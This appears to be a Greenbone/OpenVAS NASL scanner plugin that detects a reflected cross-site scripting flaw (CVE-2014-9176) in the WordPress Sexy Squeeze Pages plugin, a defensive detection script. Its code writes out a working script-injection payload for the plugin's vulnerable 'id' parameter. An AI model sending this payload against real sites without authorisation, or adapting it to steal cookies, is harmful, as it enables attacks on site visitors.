CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805121" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-9176" );
	script_bugtraq_id( 71511 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-01-09 13:32:41 +0530 (Fri, 09 Jan 2015)" );
	script_name( "WordPress Sexy Squeeze Pages 'id' Parameter XSS Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Sexy Squeeze Pages and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the /instasqueeze/lp/index.php
  script does not validate input to the 'id' parameter before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress InstaSqueeze Sexy Squeeze
  Pages Plugin" );
	script_tag( name: "solution", value: "No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/129285" );
	script_xref( name: "URL", value: "http://h4x0resec.blogspot.in/2014/11/wordpress-sexy-squeeze-pages-plugin.html" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/instasqueeze/lp/index.php?id=" + "\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "InstaSqueeze.com" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

